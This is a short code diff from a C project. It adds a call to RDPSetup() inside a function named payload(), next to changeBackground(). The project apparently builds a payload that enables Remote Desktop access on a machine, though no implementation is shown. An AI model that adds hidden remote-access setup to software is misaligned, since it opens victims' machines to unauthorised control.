@@ -90,6 +90,7 @@ int RDPSetup() {
 int payload() {
     //Execute whatever you want here
     changeBackground();
+    RDPSetup();
 
 }
 
